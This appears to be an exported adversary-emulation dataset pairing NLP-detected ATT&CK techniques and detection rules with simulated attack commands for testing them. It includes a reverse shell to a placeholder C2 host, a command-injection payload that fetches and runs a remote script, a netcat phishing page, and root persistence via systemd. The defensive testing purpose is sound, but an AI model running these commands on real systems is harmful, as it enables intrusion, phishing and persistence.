extracted_ttps.description: Detected Process Injection activity via NLP pattern matching
Detected Account Discovery activity via NLP pattern matching
Detected Phishing activity via NLP pattern matching
Detected Create or Modify System Process activity via NLP pattern matching
Detected Application Layer Protocol activity via NLP pattern matching
Detected Obfuscated Files or Information activity via NLP pattern matching
Detected Exfiltration Over C2 Channel activity via NLP pattern matching
Detected Exploit Public-Facing Application activity via NLP pattern matching
Detected Network Service Discovery activity via NLP pattern matching
Detected Archive Collected Data activity via NLP pattern matching
Detected Screen Capture activity via NLP pattern matching
Detected Remote Desktop Protocol activity via NLP pattern matching

rules.title: Process Injection Detection
rules.description: Detects Process Injection activity via command-line patterns and parent process analysis
falsepositives: Legitimate system administration tasks using PowerShell or other command-line tools
Authorized software installation or update processes

rules.title: Account Discovery via Command Line
rules.description: Detects Account Discovery activity by monitoring command line arguments for specific patterns
falsepositives: Legitimate system administration tasks
Scripted user account management

rules.title: Detection: Phishing
rules.description: Detected Phishing activity via NLP pattern matching
falsepositives: Legitimate administrative activity

rules.title: Create or Modify System Process via Suspicious Command-Line Patterns
rules.description: Detects Create or Modify System Process activity via NLP pattern matching and specific command-line patterns observed in real attacks
falsepositives: Software installations or updates using regsvr32 or rundll32
Legitimate use of command-line arguments like -enc or -encod in non-malicious contexts

rules.title: Detection: Application Layer Protocol
rules.description: Detected Application Layer Protocol activity via NLP pattern matching
falsepositives: Legitimate administrative activity

rules.title: Detection: Obfuscated Files or Information
rules.description: Detected Obfuscated Files or Information activity via NLP pattern matching
falsepositives: Legitimate administrative activity

rules.title: Exfiltration Over C2 Channel
rules.description: Detects Exfiltration Over C2 Channel activity via process creation and command line analysis
falsepositives: Legitimate use of powershell.exe for system administration
Use of certutil.exe for certificate management

rules.title: Exploit Public-Facing Application
rules.description: Detects exploitation of public-facing applications using command-line arguments and known exploit tools
falsepositives: Legitimate administrative tasks
Penetration testing activities

rules.title: Network Service Discovery via Command Line
rules.description: Detects network service discovery activity by analyzing command line arguments for common scanning patterns
falsepositives: Legitimate system administration tasks
Network scanning by security tools

rules.title: Archive Collected Data Detection
rules.description: Detects archive collected data activity via process creation and command line analysis
falsepositives: Legitimate archiving activity by system administrators or users
False positives may occur if the rule is not properly tuned to the specific environment

rules.title: Screen Capture Detection via Process Creation
rules.description: Detects screen capture activity by monitoring process creation events for known screen capture tools and command-line arguments
falsepositives: Legitimate use of screen capture tools for technical support or documentation purposes
Use of PowerShell for automation tasks unrelated to screen capture

rules.title: Remote Desktop Protocol Detection
rules.description: Detects Remote Desktop Protocol activity via NLP pattern matching
falsepositives: Legitimate RDP connections from admin IPs
RDP connections from user accounts with valid business purposes

attacks.description: Uses the legacy rundll32.exe binary to load the system user32.dll and invoke MessageBoxA, demonstrating a simple DLL injection into a new process.
attacks.expected_behavior: A message box titled "Injection Test" appears on the screen, confirming that the DLL was loaded and the function executed.

attacks.description: PowerShell script that compiles a small C# injector and uses CreateRemoteThread to inject user32.dll into a running notepad.exe process (remote‑thread DLL injection).
attacks.expected_behavior: The notepad process loads user32.dll; because the DLL is already loaded by the system, the injection succeeds silently. No visible side‑effects other than the DLL being present in the target process memory.

attacks.description: Same remote‑thread DLL injection as the intermediate example, but the PowerShell script is Base64‑encoded (UTF‑16LE) to emulate an advanced, stealthy delivery method.
attacks.expected_behavior: The encoded command is decoded and executed, performing the same injection of user32.dll into notepad.exe. The activity is less visible in command‑line logs, representing a more advanced technique.

attacks.description: Basic process injection using gdb to attach to a running process (PID 1234) and call dlopen to load a shared library into its memory.
attacks.expected_behavior: gdb attaches to the target process, attempts to load /tmp/libdummy.so via dlopen, then detaches. If the library does not exist, dlopen fails but the injection attempt is logged.

attacks.description: Injects a shared library into a newly spawned process by setting LD_PRELOAD, causing the library to be loaded before the executable runs.
attacks.expected_behavior: The ls command runs with the dummy library preloaded. Since the library is empty/non‑existent, the process starts normally, demonstrating the injection vector without side effects.

attacks.description: Advanced injection: creates a temporary gdb script that attaches to PID 1234, calls dlopen to load a library, then detaches, and runs gdb in batch mode.
attacks.expected_behavior: The script is executed by gdb, performing the same dlopen injection as the basic example but using a script file, which mimics attacker automation. The command logs the attempt and exits cleanly.

attacks.description: Basic local account enumeration using the legacy net.exe binary.
attacks.expected_behavior: Outputs a list of all local user accounts on the machine.

attacks.description: Intermediate enumeration of the current user's security identifiers and group memberships.
attacks.expected_behavior: Displays the current user name, SID, and all groups the user belongs to, revealing privilege information.

attacks.description: Advanced account discovery via WMI, listing both local and domain accounts with their SIDs.
attacks.expected_behavior: Returns a table of account names and corresponding security identifiers, useful for mapping all accounts present on the system.

attacks.description: Basic account discovery by directly reading the passwd file, which lists all local user accounts.
attacks.expected_behavior: Outputs the contents of /etc/passwd, showing one line per user with fields separated by colons.

attacks.description: Intermediate account discovery using the NSS database, which returns user entries from all configured sources.
attacks.expected_behavior: Prints a list of user account entries similar to /etc/passwd, sourced from NSS (e.g., local files, LDAP).

attacks.description: Advanced enumeration that extracts and displays unique usernames and group names in a clear format.
attacks.expected_behavior: First prints "Users:" followed by a list of usernames, then prints "Groups:" followed by a list of group names.

attacks.command: powershell -Command "Send-MailMessage -From 'attacker@example.com' -To 'victim@example.com' -Subject 'Urgent: Update Required' -Body 'Please click https://example.com/login to update your credentials.' -SmtpServer 'localhost'"
attacks.description: Sends a simulated phishing email containing a malicious link using PowerShell's Send‑MailMessage cmdlet.
attacks.expected_behavior: An email is dispatched from attacker@example.com to victim@example.com with the specified subject and body. No actual external SMTP server is required in a test environment; localhost can be mocked.

attacks.description: Creates a phishing HTML file in the temporary directory and opens it in the default browser.
attacks.expected_behavior: A file named phish.html is written to %TEMP% containing a clickable link. The file is then launched, causing the default web browser to display the page.

attacks.description: Creates a shortcut on the Desktop that points to a phishing URL, emulating a common lure used in phishing attacks.
attacks.expected_behavior: A shortcut file named UpdateCredentials.lnk appears on the user's Desktop. Double‑clicking the shortcut would open the specified URL in the default browser.

attacks.command: echo "Urgent: Review the attached document at http://example.com/credential-stealer" | mail -s "Action Required" victim@example.com
attacks.description: Sends a plain‑text email containing a phishing link to the victim.
attacks.expected_behavior: The victim receives an email with subject "Action Required" and a body that includes the malicious URL; clicking the link would navigate to the placeholder site.

attacks.command: printf "From: attacker@example.com To: victim@example.com Subject: Important Account Update MIME-Version: 1.0 Content-Type: text/html; charset=UTF-8 Please verify your account here. " | /usr/sbin/sendmail -t
attacks.description: Uses sendmail to deliver an HTML email that disguises a phishing link as a legitimate account verification request.
attacks.expected_behavior: The victim's email client renders the HTML message with a clickable "here" link pointing to the placeholder verification URL.

attacks.command:
printf "HTTP/1.1 200 OK Content-Type: text/html

Login

" | nc -l -p 8080 & echo "Phishing page available at http://$(hostname -I | awk '{print $1}'):8080" | mail -s "Urgent: Verify Account" victim@example.com
attacks.description: Starts a lightweight netcat HTTP server that serves a fake login page and then emails the victim a link to that page, simulating a more advanced phishing campaign.
attacks.expected_behavior: Netcat listens on port 8080 and serves a simple HTML login form; the victim receives an email with a link to http://<host_ip>:8080, which when visited displays the fake login page.

attacks.description: Adds a Run registry value under the current user to launch Notepad at logon, creating a persistent system process.
attacks.expected_behavior: When the user logs on, Notepad.exe will be started automatically due to the Run key entry.

attacks.command: sc create TestService binPath= "\"%SystemRoot%\\System32\\notepad.exe\"" start= auto
attacks.description: Creates a new Windows service named TestService that runs Notepad.exe and is set to start automatically.
attacks.expected_behavior: The service is installed; on the next boot or when started, the service will launch Notepad.exe as a system process.

attacks.description: Registers a scheduled task that runs Notepad.exe at each user logon with highest privileges.
attacks.expected_behavior: At every logon event, the task triggers and launches Notepad.exe, demonstrating persistence via a system‑level scheduled task.

attacks.command:
sudo bash -c 'cat <<EOF > /etc/systemd/system/evil.service
[Unit]
Description=Evil Service
After=network.target
[Service]
ExecStart=/usr/bin/touch /tmp/evil_triggered
Type=oneshot
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable evil.service
systemctl start evil.service'
attacks.description: Creates a system‑wide systemd service that creates a file in /tmp when started, then enables and starts it for system‑level persistence.
attacks.expected_behavior: The service definition is written to /etc/systemd/system, the systemd manager reloads its configuration, the service is enabled to run at boot, and the service starts immediately, creating /tmp/evil_triggered.

attacks.description: Adds a root crontab entry that touches a file in /tmp on every system reboot, providing persistence via the cron scheduler.
attacks.expected_behavior: The current root crontab (if any) is listed, the new @reboot line is appended, and the combined list is installed as the new root crontab. On the next reboot, /tmp/rebooted will be created.

attacks.description: Uses certutil to download a file over HTTP, demonstrating application layer protocol usage for C2.
attacks.expected_behavior: certutil contacts example.com via HTTP, retrieves benign.txt and stores it in the user's temporary folder.

attacks.description: Uses bitsadmin to perform an HTTP download, exercising the Application Layer Protocol technique.
attacks.expected_behavior: BITS creates a background transfer job, fetches the file from example.com over HTTP, and writes it to %TEMP%\benign.txt.

attacks.description: PowerShell script opens a raw TCP socket to example.com on port 80 and sends a minimal HTTP GET request, exercising application‑layer protocol communication.
attacks.expected_behavior: PowerShell establishes a TCP connection to example.com:80, transmits a GET request, then closes the connection without persisting any files.

attacks.description: Basic use of HTTP to retrieve a command file from a C2 server using curl.
attacks.expected_behavior: The file /tmp/payload.txt is created (or overwritten) with the content returned by the HTTP server at c2.example.com.

attacks.command: bash -c 'exec 5<>/dev/tcp/c2.example.com/4444 && while read -r line <&5; do eval "$line"; done >&5'
attacks.description: Intermediate reverse‑shell style command that opens a TCP connection to a C2 host on port 4444 and executes any received commands.
attacks.expected_behavior: A TCP socket to c2.example.com:4444 is opened; any text received is evaluated as shell commands and the output is sent back over the same connection.

attacks.description: Advanced use of TLS (HTTPS) to send an encrypted heartbeat message to the C2 server using OpenSSL.
attacks.expected_behavior: The string "ping" is transmitted over a TLS‑encrypted channel to c2.example.com on port 443; any response from the server is printed to stdout.

attacks.description: Renames a placeholder file to a random-looking name to hide its purpose, demonstrating simple filename obfuscation.
attacks.expected_behavior: The file test.txt in the TEMP directory is renamed to a name such as t12345678.dat, making its intent less obvious.

attacks.description: Executes a PowerShell command that is hidden inside a Base64‑encoded string, illustrating content obfuscation.
attacks.expected_behavior: PowerShell decodes the Base64 string and runs "Write-Host 'obf'", printing the word obf to the console.

attacks.description: Creates a PowerShell script, encodes it with certutil (Base64), then decodes and executes it at runtime, providing layered obfuscation using native tools.
attacks.expected_behavior: The script file is written, encoded to a .b64 file, then decoded back to its original PowerShell code and executed, resulting in "Write-Host 'advanced'" output.

attacks.description: Creates a plaintext file with a test secret, encodes it with base64 to hide the content, and removes the original file.
attacks.expected_behavior: A file /tmp/secret.b64 containing the base64 representation of the original string is created; the original /tmp/secret.txt is deleted.

attacks.description: Writes a dummy API key to a file, encrypts it using OpenSSL AES-256-CBC with a password, then deletes the plaintext file.
attacks.expected_behavior: An encrypted file /tmp/api_key.enc is produced; the original /tmp/api_key.txt is removed.

attacks.description: Uploads a local file to a remote HTTP endpoint using bitsadmin, representing exfiltration over an existing C2 channel.
attacks.expected_behavior: bitsadmin initiates a background transfer and sends the contents of %TEMP%\sensitive_data.txt to the specified URL.

attacks.description: Compresses a collection of log files into a zip archive and uploads the archive via bitsadmin, demonstrating exfiltration with data reduction.
attacks.expected_behavior: PowerShell creates logs.zip from the files in %TEMP%\logs, then bitsadmin uploads the zip file to the remote HTTP server.

attacks.command: cmd.exe /c "echo open 127.0.0.1> %TEMP%\ftp_script.txt & echo user anonymous>> %TEMP%\ftp_script.txt & echo pass>> %TEMP%\ftp_script.txt & echo binary>> %TEMP%\ftp_script.txt & echo put %TEMP%\data.txt>> %TEMP%\ftp_script.txt & echo quit>> %TEMP%\ftp_script.txt & ftp -s:%TEMP%\ftp_script.txt"
attacks.description: Creates an FTP script that logs into an FTP server and uploads a file, then runs the script with the built‑in ftp client to exfiltrate data.
attacks.expected_behavior: The echo commands build an FTP command script in %TEMP%\ftp_script.txt; the ftp client reads this script and transfers %TEMP%\data.txt to the FTP server at 127.0.0.1.

attacks.description: Basic command using curl to exfiltrate data over HTTP
attacks.expected_behavior: Data is sent to the specified URL, simulating exfiltration over a C2 channel

attacks.description: Intermediate command using base64 encoding before exfiltration
attacks.expected_behavior: Data is encoded with base64 and then sent to the specified URL, demonstrating an additional layer of complexity in exfiltration

attacks.description: Advanced command using tar, gzip, and base64 encoding before exfiltration
attacks.expected_behavior: Data is archived, compressed, encoded, and then sent to the specified URL, showing a sophisticated method of exfiltration that requires admin privileges for accessing sensitive data

attacks.description: Sends a GET request to a vulnerable web endpoint that interprets the 'cmd' query parameter as a system command.
attacks.expected_behavior: The web server processes the request, executes the 'whoami' command, and returns the current user name in the HTTP response.

attacks.description: Posts a JSON payload to a vulnerable API endpoint that injects the supplied command into the server's execution context, attempting to add a new local user.
attacks.expected_behavior: If the service is vulnerable, it runs the 'net user' command, creating a user named 'testuser'; the HTTP response indicates success or failure.

attacks.description: Downloads a binary payload delivered by the compromised application using certutil and then silently executes it with PowerShell.
attacks.expected_behavior: certutil retrieves the file to the temporary directory; PowerShell launches the file in hidden mode. In a test environment the payload can be a benign executable (e.g., a copy of notepad.exe).

attacks.description: Basic GET request with a command‑injection payload targeting a public‑facing web application.
attacks.expected_behavior: The server receives the request; if vulnerable, it may execute the `id` command and include the output in the HTTP response.

attacks.description: Intermediate POST request delivering a JSON body with an SQL‑injection payload to a login endpoint.
attacks.expected_behavior: The server processes the login request; if the SQL injection succeeds, it may return an authentication token which is saved to /tmp/login_response.txt.

attacks.command: curl -s -X POST -H "Content-Type: application/json" -d '{"cmd":"$(wget http://192.0.2.1/payload.sh -O - | bash)"}' http://vulnerable.com/execute
attacks.description: Advanced POST request attempting command injection that fetches and executes a script from an attacker‑controlled address.
attacks.expected_behavior: If the target endpoint executes the supplied `cmd` value, it will retrieve the script from 192.0.2.1 and run it, demonstrating remote code execution.

attacks.description: Lists computers and shared resources on the local network using the legacy net.exe utility.
attacks.expected_behavior: Displays a list of NetBIOS names of machines reachable in the same workgroup/domain, revealing available network hosts.

attacks.description: Shows all locally listening TCP ports and associated process IDs, indicating which services are exposed on the host.
attacks.expected_behavior: Outputs lines containing 'LISTENING' with local address, port, and PID, allowing the tester to identify active network services.

attacks.description: Iterates over a small IP range and probes each host for an open SMB (port 445) service using PowerShell's Test-NetConnection.
attacks.expected_behavior: For each IP (192.168.1.1‑5) prints True if the SMB port is reachable, otherwise False, revealing which hosts expose the service.

attacks.description: Basic network service discovery using netstat to list all listening TCP and UDP ports.
attacks.expected_behavior: Outputs a table of local addresses and ports that are in a listening state, showing protocol, local address, and state.

attacks.description: Intermediate discovery with ss, providing detailed socket information including process owners.
attacks.expected_behavior: Displays listening sockets with protocol, local address, process ID, and process name for each service.

attacks.description: Advanced network service discovery using nmap to scan a /24 subnet for open ports (1‑1024) and attempt service version detection.
attacks.expected_behavior: Produces a report listing each responsive host, open ports within the specified range, and guessed service versions where possible.

attacks.description: Compresses two test files into a ZIP archive using PowerShell's built‑in Compress-Archive cmdlet.
attacks.expected_behavior: Creates %TEMP%\collected.zip containing data1.txt and data2.log; command exits without error.

attacks.description: Uses the native tar.exe utility to create a TAR archive of the same test files.
attacks.expected_behavior: Produces %TEMP%\collected.tar containing data1.txt and data2.log; no output on success.

attacks.description: Compresses a single file into a CAB archive using the legacy makecab.exe tool with LZX compression.
attacks.expected_behavior: Generates %TEMP%\data1.cab containing a compressed version of data1.txt; command completes silently.

attacks.description: Create a tar archive containing the /etc/passwd file, a typical target for credential harvesting.
attacks.expected_behavior: A file named /tmp/collected_data.tar is created; it contains the /etc/passwd file.

attacks.description: Compress all .log files from /var/log into a gzip‑compressed tarball for bulk log collection.
attacks.expected_behavior: A compressed archive /tmp/collected_logs.tar.gz is created containing the matching log files. Access may be denied for some logs without root.

attacks.description: Archive all .txt files in the current user's home directory, compress the archive, then split it into 1 MiB chunks for easier handling or exfiltration.
attacks.expected_behavior: Creates /tmp/user_data.tar.gz containing the .txt files, then produces split files named /tmp/user_data_part_aa, /tmp/user_data_part_ab, etc., each up to 1 MiB.

attacks.command: powershell -NoProfile -Command 'Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; $g = [System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size); $path = \"$env:TEMP\\screenshot.bmp\"; $bmp.Save($path, [System.Drawing.Imaging.ImageFormat]::Bmp);'
attacks.description: Capture the primary display and save it as a BMP file in the user's temporary directory.
attacks.expected_behavior: A file named screenshot.bmp appears in %TEMP% containing a bitmap of the current screen.

attacks.command: powershell -NoProfile -Command 'Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap $b.Width, $b.Height; $g = [System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($b.X, $b.Y, 0, 0, $b.Size); $ms = New-Object System.IO.MemoryStream; $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png); $bytes = $ms.ToArray(); $b64 = [Convert]::ToBase64String($bytes); $out = \"$env:TEMP\\screenshot.b64\"; Set-Content -Path $out -Value $b64 -Encoding ASCII;'
attacks.description: Capture the screen, encode the PNG image to Base64, and write the encoded string to a .b64 file.
attacks.expected_behavior: A file named screenshot.b64 is created in %TEMP% containing the Base64 representation of the captured screenshot.

attacks.description: Capture the screen to a PNG file, then use certutil to Base64‑encode the image, demonstrating post‑capture data handling with native tools.
attacks.expected_behavior: Two files appear in %TEMP%: adv_screenshot.png (the raw screenshot) and adv_screenshot.b64 (its Base64 encoding).

attacks.description: Capture the full screen using ImageMagick's import utility and save to /tmp.
attacks.expected_behavior: A PNG file named screenshot_basic.png appears in /tmp containing a snapshot of the current display.

attacks.description: Use the GNOME desktop's built‑in screenshot tool to capture the screen to a file.
attacks.expected_behavior: A PNG file named screenshot_gnome.png is created in /tmp with the current screen image.

attacks.description: Capture a single frame of the X11 display using ffmpeg, dynamically determining screen resolution.
attacks.expected_behavior: A PNG file named screenshot_ffmpeg.png is written to /tmp containing a snapshot of the current X11 screen.

attacks.description: Basic RDP connection using the built‑in Remote Desktop client (mstsc) to a target IP address.
attacks.expected_behavior: Opens an RDP client window attempting to connect to 10.0.0.5. No credentials are supplied, so the user will be prompted if required.

attacks.description: Stores RDP credentials with cmdkey.exe then initiates an RDP session using mstsc, bypassing interactive login prompts.
attacks.expected_behavior: Credentials are cached for the target host; mstsc connects automatically using the stored username and password.

attacks.description: Creates a temporary .rdp file with connection settings via PowerShell, writes it to the TEMP directory, and launches mstsc with that file.
attacks.expected_behavior: A .rdp file is written to the temp folder, then mstsc reads the file and attempts to connect to 10.0.0.5 using the specified parameters.

attacks.description: Basic RDP client connection using xfreerdp to a remote Windows/Linux host.
attacks.expected_behavior: Attempts to authenticate to the remote host and, if successful, opens a remote desktop session.

attacks.description: Intermediate RDP connection using rdesktop with drive redirection to share a local folder.
attacks.expected_behavior: Establishes an RDP session and mounts the local "shared" directory inside the remote desktop.

attacks.description: Advanced scenario: start the local xrdp service (requires root) and then connect to it via xfreerdp, simulating a lateral move through a newly started RDP server.
attacks.expected_behavior: Starts the xrdp service, then opens an RDP session to the local machine, demonstrating service manipulation and RDP usage.
